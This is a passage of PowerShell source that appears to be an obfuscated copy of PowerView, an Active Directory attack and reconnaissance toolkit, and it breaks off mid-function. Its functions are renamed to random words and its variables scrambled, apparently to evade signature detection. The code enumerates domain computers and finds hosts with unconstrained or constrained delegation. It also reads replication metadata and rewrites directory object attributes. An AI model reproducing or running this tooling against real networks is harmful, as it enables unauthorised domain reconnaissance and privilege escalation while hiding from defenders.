        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['SecurityMasks']) { $sMQTvMNR99['SecurityMasks'] = $nZWoutdh99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $GIcnDVyZ99 = bleachers @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            salesclerk -CoUPmHUh99 -kMozdLZB99 $PSBoundParameters
        }
        if ($GIcnDVyZ99) {
            $UztPqXyf99 = ''
            $bNYXjnRz99 = ''
            $soGjewdO99 | Where-Object {$_} | ForEach-Object {
                $hDkTAaiv99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($hDkTAaiv99 -match '^S-1-') {
                    $UztPqXyf99 += "(objectsid=$hDkTAaiv99)"
                }
                elseif ($hDkTAaiv99 -match '^CN=') {
                    $UztPqXyf99 += "(distinguishedname=$hDkTAaiv99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $CBPYVhlj99 = $hDkTAaiv99.SubString($hDkTAaiv99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[sensationalist] Extracted domain '$CBPYVhlj99' from '$hDkTAaiv99'"
                        $sMQTvMNR99['Domain'] = $CBPYVhlj99
                        $GIcnDVyZ99 = bleachers @SearcherArguments
                        if (-not $GIcnDVyZ99) {
                            Write-Warning "[sensationalist] Unable to retrieve domain searcher for '$CBPYVhlj99'"
                        }
                    }
                }
                elseif ($hDkTAaiv99.Contains('.')) {
                    $UztPqXyf99 += "(|(name=$hDkTAaiv99)(dnshostname=$hDkTAaiv99))"
                }
                elseif ($hDkTAaiv99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $ouzLqIgS99 = (([Guid]$hDkTAaiv99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $UztPqXyf99 += "(objectguid=$ouzLqIgS99)"
                }
                else {
                    $UztPqXyf99 += "(name=$hDkTAaiv99)"
                }
            }
            if ($UztPqXyf99 -and ($UztPqXyf99.Trim() -ne '') ) {
                $bNYXjnRz99 += "(|$UztPqXyf99)"
            }
            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[sensationalist] Searching for computers with for unconstrained delegation'
                $bNYXjnRz99 += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[sensationalist] Searching for computers that are trusted to authenticate for other principals'
                $bNYXjnRz99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[sensationalist] Searching for printers'
                $bNYXjnRz99 += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[sensationalist] Searching for computers with SPN: $SPN"
                $bNYXjnRz99 += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[sensationalist] Searching for computers with operating system: $fvZEnbGC99"
                $bNYXjnRz99 += "(operatingsystem=$fvZEnbGC99)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[sensationalist] Searching for computers with service pack: $fGspowYC99"
                $bNYXjnRz99 += "(operatingsystemservicepack=$fGspowYC99)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[sensationalist] Searching for computers with site name: $DgPmuXLw99"
                $bNYXjnRz99 += "(serverreferencebl=$DgPmuXLw99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[sensationalist] Using additional LDAP filter: $WmhkcxXr99"
                $bNYXjnRz99 += "$WmhkcxXr99"
            }
            $oEiFABWx99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $bFaXJzkM99 = $_.Substring(4)
                    $hwVZUotr99 = [Int]($qulkrNPT99::$bFaXJzkM99)
                    $bNYXjnRz99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$hwVZUotr99))"
                }
                else {
                    $hwVZUotr99 = [Int]($qulkrNPT99::$_)
                    $bNYXjnRz99 += "(userAccountControl:1.2.840.113556.1.4.803:=$hwVZUotr99)"
                }
            }
            $GIcnDVyZ99.filter = "(&(samAccountType=805306369)$bNYXjnRz99)"
            Write-Verbose "[sensationalist] sensationalist filter string: $($GIcnDVyZ99.filter)"
            if ($PSBoundParameters['FindOne']) { $mKhNNgkp99 = $GIcnDVyZ99.FindOne() }
            else { $mKhNNgkp99 = $GIcnDVyZ99.FindAll() }
            $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -FRrsCtDf99 $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        $aJJGHudX99 = $_
                        $aJJGHudX99.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $aJJGHudX99 = Johnson -rtPnFfWd99 $_.Properties
                        $aJJGHudX99.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $aJJGHudX99
                }
            }
            if ($mKhNNgkp99) {
                try { $mKhNNgkp99.dispose() }
                catch {
                    Write-Verbose "[sensationalist] Error disposing of the Results object: $_"
                }
            }
            $GIcnDVyZ99.dispose()
        }
    }
}
function great {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $soGjewdO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $nZWoutdh99,
        [Switch]
        $mIpZvziV99,
        [Alias('ReturnOne')]
        [Switch]
        $HyjxYAeb99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $vABbOHXX99 = [Enum]::GetNames($qulkrNPT99)
        $vABbOHXX99 = $vABbOHXX99 | ForEach-Object {$_; "NOT_$_"}
        salesclerk -Name UACFilter -BobOgiWP99 $vABbOHXX99 -Type ([array])
    }
    BEGIN {
        $sMQTvMNR99 = @{}
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Properties']) { $sMQTvMNR99['Properties'] = $rtPnFfWd99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['SecurityMasks']) { $sMQTvMNR99['SecurityMasks'] = $nZWoutdh99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $rLSxehXn99 = bleachers @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            salesclerk -CoUPmHUh99 -kMozdLZB99 $PSBoundParameters
        }
        if ($rLSxehXn99) {
            $UztPqXyf99 = ''
            $bNYXjnRz99 = ''
            $soGjewdO99 | Where-Object {$_} | ForEach-Object {
                $hDkTAaiv99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($hDkTAaiv99 -match '^S-1-') {
                    $UztPqXyf99 += "(objectsid=$hDkTAaiv99)"
                }
                elseif ($hDkTAaiv99 -match '^(CN|OU|DC)=') {
                    $UztPqXyf99 += "(distinguishedname=$hDkTAaiv99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $CBPYVhlj99 = $hDkTAaiv99.SubString($hDkTAaiv99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[great] Extracted domain '$CBPYVhlj99' from '$hDkTAaiv99'"
                        $sMQTvMNR99['Domain'] = $CBPYVhlj99
                        $rLSxehXn99 = bleachers @SearcherArguments
                        if (-not $rLSxehXn99) {
                            Write-Warning "[great] Unable to retrieve domain searcher for '$CBPYVhlj99'"
                        }
                    }
                }
                elseif ($hDkTAaiv99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $ouzLqIgS99 = (([Guid]$hDkTAaiv99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $UztPqXyf99 += "(objectguid=$ouzLqIgS99)"
                }
                elseif ($hDkTAaiv99.Contains('\')) {
                    $zFZKzTFZ99 = $hDkTAaiv99.Replace('\28', '(').Replace('\29', ')') | spokesmen -LkQAjVeR99 Canonical
                    if ($zFZKzTFZ99) {
                        $sUeVoDxL99 = $zFZKzTFZ99.SubString(0, $zFZKzTFZ99.IndexOf('/'))
                        $NUBJRpba99 = $hDkTAaiv99.Split('\')[1]
                        $UztPqXyf99 += "(samAccountName=$NUBJRpba99)"
                        $sMQTvMNR99['Domain'] = $sUeVoDxL99
                        Write-Verbose "[great] Extracted domain '$sUeVoDxL99' from '$hDkTAaiv99'"
                        $rLSxehXn99 = bleachers @SearcherArguments
                    }
                }
                elseif ($hDkTAaiv99.Contains('.')) {
                    $UztPqXyf99 += "(|(samAccountName=$hDkTAaiv99)(name=$hDkTAaiv99)(dnshostname=$hDkTAaiv99))"
                }
                else {
                    $UztPqXyf99 += "(|(samAccountName=$hDkTAaiv99)(name=$hDkTAaiv99)(displayname=$hDkTAaiv99))"
                }
            }
            if ($UztPqXyf99 -and ($UztPqXyf99.Trim() -ne '') ) {
                $bNYXjnRz99 += "(|$UztPqXyf99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[great] Using additional LDAP filter: $WmhkcxXr99"
                $bNYXjnRz99 += "$WmhkcxXr99"
            }
            $oEiFABWx99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $bFaXJzkM99 = $_.Substring(4)
                    $hwVZUotr99 = [Int]($qulkrNPT99::$bFaXJzkM99)
                    $bNYXjnRz99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$hwVZUotr99))"
                }
                else {
                    $hwVZUotr99 = [Int]($qulkrNPT99::$_)
                    $bNYXjnRz99 += "(userAccountControl:1.2.840.113556.1.4.803:=$hwVZUotr99)"
                }
            }
            if ($bNYXjnRz99 -and $bNYXjnRz99 -ne '') {
                $rLSxehXn99.filter = "(&$bNYXjnRz99)"
            }
            Write-Verbose "[great] great filter string: $($rLSxehXn99.filter)"
            if ($PSBoundParameters['FindOne']) { $mKhNNgkp99 = $rLSxehXn99.FindOne() }
            else { $mKhNNgkp99 = $rLSxehXn99.FindAll() }
            $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = Johnson -rtPnFfWd99 $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($mKhNNgkp99) {
                try { $mKhNNgkp99.dispose() }
                catch {
                    Write-Verbose "[great] Error disposing of the Results object: $_"
                }
            }
            $rLSxehXn99.dispose()
        }
    }
}
function quisling {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $soGjewdO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $sMQTvMNR99 = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['LDAPFilter']) { $sMQTvMNR99['LDAPFilter'] = $WmhkcxXr99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['FindOne']) { $sMQTvMNR99['FindOne'] = $HyjxYAeb99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        if ($PSBoundParameters['Properties']) {
            $ITemWBXM99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $ITemWBXM99 = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $sMQTvMNR99['Identity'] = $soGjewdO99 }
        great @SearcherArguments | ForEach-Object {
            $HfJKdMKz99 = $_.Properties['distinguishedname'][0]
            ForEach($kmMQNyzM99 in $_.Properties['msds-replattributemetadata']) {
                $aooRtOxg99 = [xml]$kmMQNyzM99 | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($aooRtOxg99) {
                    if ($aooRtOxg99.pszAttributeName -Match $ITemWBXM99) {
                        $MZchCEdW99 = New-Object PSObject
                        $MZchCEdW99 | Add-Member NoteProperty 'ObjectDN' $HfJKdMKz99
                        $MZchCEdW99 | Add-Member NoteProperty 'AttributeName' $aooRtOxg99.pszAttributeName
                        $MZchCEdW99 | Add-Member NoteProperty 'LastOriginatingChange' $aooRtOxg99.ftimeLastOriginatingChange
                        $MZchCEdW99 | Add-Member NoteProperty 'Version' $aooRtOxg99.dwVersion
                        $MZchCEdW99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $aooRtOxg99.pszLastOriginatingDsaDN
                        $MZchCEdW99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $MZchCEdW99
                    }
                }
                else {
                    Write-Verbose "[quisling] Error retrieving 'msds-replattributemetadata' for '$HfJKdMKz99'"
                }
            }
        }
    }
}
function booths {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $soGjewdO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $sMQTvMNR99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['LDAPFilter']) { $sMQTvMNR99['LDAPFilter'] = $WmhkcxXr99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        if ($PSBoundParameters['Properties']) {
            $ITemWBXM99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $ITemWBXM99 = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $sMQTvMNR99['Identity'] = $soGjewdO99 }
        great @SearcherArguments | ForEach-Object {
            $HfJKdMKz99 = $_.Properties['distinguishedname'][0]
            ForEach($kmMQNyzM99 in $_.Properties['msds-replvaluemetadata']) {
                $aooRtOxg99 = [xml]$kmMQNyzM99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($aooRtOxg99) {
                    if ($aooRtOxg99.pszAttributeName -Match $ITemWBXM99) {
                        $MZchCEdW99 = New-Object PSObject
                        $MZchCEdW99 | Add-Member NoteProperty 'ObjectDN' $HfJKdMKz99
                        $MZchCEdW99 | Add-Member NoteProperty 'AttributeName' $aooRtOxg99.pszAttributeName
                        $MZchCEdW99 | Add-Member NoteProperty 'AttributeValue' $aooRtOxg99.pszObjectDn
                        $MZchCEdW99 | Add-Member NoteProperty 'TimeCreated' $aooRtOxg99.ftimeCreated
                        $MZchCEdW99 | Add-Member NoteProperty 'TimeDeleted' $aooRtOxg99.ftimeDeleted
                        $MZchCEdW99 | Add-Member NoteProperty 'LastOriginatingChange' $aooRtOxg99.ftimeLastOriginatingChange
                        $MZchCEdW99 | Add-Member NoteProperty 'Version' $aooRtOxg99.dwVersion
                        $MZchCEdW99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $aooRtOxg99.pszLastOriginatingDsaDN
                        $MZchCEdW99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $MZchCEdW99
                    }
                }
                else {
                    Write-Verbose "[booths] Error retrieving 'msds-replvaluemetadata' for '$HfJKdMKz99'"
                }
            }
        }
    }
}
function cheapens {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $soGjewdO99,
        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $sMQTvMNR99 = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['LDAPFilter']) { $sMQTvMNR99['LDAPFilter'] = $WmhkcxXr99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $sMQTvMNR99['Identity'] = $soGjewdO99 }
        $sFKBIpDb99 = great @SearcherArguments
        ForEach ($Object in $sFKBIpDb99) {
            $Entry = $sFKBIpDb99.GetDirectoryEntry()
            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[cheapens] Setting '$($_.Name)' to '$($_.Value)' for object '$($sFKBIpDb99.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[cheapens] Error setting/replacing properties for object '$($sFKBIpDb99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $fhGTcMRg99 = $_.Name
                        $UMQsChgJ99 = $_.Value
                        Write-Verbose "[cheapens] XORing '$fhGTcMRg99' with '$UMQsChgJ99' for object '$($sFKBIpDb99.Properties.samaccountname)'"
                        $mhgpsPZM99 = $Entry.$fhGTcMRg99[0].GetType().name
                        $aSzBmywh99 = $($Entry.$fhGTcMRg99) -bxor $UMQsChgJ99
                        $Entry.$fhGTcMRg99 = $aSzBmywh99 -as $mhgpsPZM99
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[cheapens] Error XOR'ing properties for object '$($sFKBIpDb99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $fhGTcMRg99 = $_
                        Write-Verbose "[cheapens] Clearing '$fhGTcMRg99' for object '$($sFKBIpDb99.Properties.samaccountname)'"
                        $Entry.$fhGTcMRg99.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[cheapens] Error clearing properties for object '$($sFKBIpDb99.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}
function Beelzebub {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $WWkUEZKq99
    )
    Begin {
        if($WWkUEZKq99.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }
        function nonevent {
            Param (
                [int[]]
                $aOdMcYjU99
            )
            $CRRBfdOm99 = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $aOdMcYjU99[$i]
                $gqSThzCi99 = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')
                $CRRBfdOm99[$gqSThzCi99+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $CRRBfdOm99[$gqSThzCi99+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $CRRBfdOm99[$gqSThzCi99+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $CRRBfdOm99[$gqSThzCi99+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $CRRBfdOm99[$gqSThzCi99+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $CRRBfdOm99[$gqSThzCi99+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $CRRBfdOm99[$gqSThzCi99+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $CRRBfdOm99[$gqSThzCi99+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }
            $CRRBfdOm99
        }
    }
    Process {
        $MZchCEdW99 = @{
            Sunday = nonevent -aOdMcYjU99 $WWkUEZKq99[0..2]
            Monday = nonevent -aOdMcYjU99 $WWkUEZKq99[3..5]
            Tuesday = nonevent -aOdMcYjU99 $WWkUEZKq99[6..8]
            Wednesday = nonevent -aOdMcYjU99 $WWkUEZKq99[9..11]
            Thurs = nonevent -aOdMcYjU99 $WWkUEZKq99[12..14]
            Friday = nonevent -aOdMcYjU99 $WWkUEZKq99[15..17]
            Saturday = nonevent -aOdMcYjU99 $WWkUEZKq99[18..20]
        }
        $MZchCEdW99 = New-Object PSObject -Property $MZchCEdW99
        $MZchCEdW99.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $MZchCEdW99
    }
}
function intelligent {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $kuSzUQEs99,
        [ValidateNotNullOrEmpty()]
        [String]
        $vumVLVsx99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True)]
